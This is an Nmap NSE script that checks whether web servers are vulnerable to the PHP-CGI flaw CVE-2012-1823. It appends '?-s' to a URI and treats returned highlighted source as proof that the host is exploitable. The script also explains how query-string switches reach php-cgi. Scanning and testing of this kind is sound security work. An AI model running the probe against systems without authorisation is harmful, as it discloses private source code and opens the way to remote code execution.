local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local vulns = require "vulns"

description = [[
Detects PHP-CGI installations that are vulnerable to CVE-2012-1823, This critical vulnerability allows attackers to retrieve source code and execute code remotely.

The script works by appending "?-s" to the uri to make vulnerable php-cgi handlers return colour syntax highlighted source. We use the pattern "<span style=.*>&lt;?" to detect
vulnerable installations.

TODO:
-Improve detection mechanism ( Execute certain payload and look for it in the response to confirm exploitability)
-Add exploitation script
]]

---
-- @usage
-- nmap -sV --script http-vuln-cve2012-1823 <target>
-- nmap -p80 --script http-vuln-cve2012-1823 --script-args http-vuln-cve2012-1823.uri=/test.php <target>
-- @output
-- PORT   STATE SERVICE REASON
-- 80/tcp open  http    syn-ack
-- | http-vuln-cve2012-1823: 
-- |   VULNERABLE:
-- |   PHP-CGI Remote code execution and source code disclosure
-- |     State: VULNERABLE (Exploitable)
-- |     IDs:  CVE:2012-1823
-- |     Description:
-- |       According to PHP's website, "PHP is a widely-used general-purpose
-- |       scripting language that is especially suited for Web development and
-- |       can be embedded into HTML." When PHP is used in a CGI-based setup
-- |       (such as Apache's mod_cgid), the php-cgi receives a processed query
-- |       string parameter as command line arguments which allows command-line
-- |       switches, such as -s, -d or -c to be passed to the php-cgi binary,
-- |       which can be exploited to disclose source code and obtain arbitrary
-- |       code execution.
-- |     Disclosure date: 2012-05-3
-- |     Extra information:
-- |       Proof of Concept:/index.php?-s
-- |     References:
-- |       http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/
-- |       http://cve.mitre.org/cgi-bin/cvename.cgi?name=2012-1823
-- |_      http://ompldr.org/vZGxxaQ
--
-- @args http-vuln-cve2012-1823.uri URI. Default: /index.php
---

author = "Paulino Calderon"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"exploit","vuln","intrusive"}


portrule = shortport.http

action = function(host, port)
  local uri = stdnse.get_script_args(SCRIPT_NAME..".uri") or "/index.php"

  local vuln = {
       title = 'PHP-CGI Remote code execution and source code disclosure',
       state = vulns.STATE.NOT_VULN, -- default
       IDS = {CVE = '2012-1823'},
       description = [[
According to PHP's website, "PHP is a widely-used general-purpose
scripting language that is especially suited for Web development and
can be embedded into HTML." When PHP is used in a CGI-based setup
(such as Apache's mod_cgid), the php-cgi receives a processed query
string parameter as command line arguments which allows command-line
switches, such as -s, -d or -c to be passed to the php-cgi binary,
which can be exploited to disclose source code and obtain arbitrary
code execution.]],
       references = {
          'http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/',
           'http://ompldr.org/vZGxxaQ',
       },
       dates = {
           disclosure = {year = '2012', month = '05', day = '3'},
       },
     }
  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)

  local reg_session = http.get(host, port, uri)
  if reg_session and reg_session.status == 200 then
    if string.match(reg_session.body, "<span style=.*>&lt;?") then
      stdnse.print_debug(1, "Pattern exists on file! We can't determine if this page is vulnerable. Try with a different URI.")
      return
    end
  end

  local open_session = http.get(host, port, uri.."?-s")
  if open_session and open_session.status == 200 then
     if string.match(open_session.body, "<span style=.*>&lt;?") then
        vuln.state = vulns.STATE.EXPLOIT
        vuln.extra_info=string.format("Proof of Concept:%s\n%s", uri.."?-s", open_session.body)
        return vuln_report:make_output(vuln)
     end
  end
end
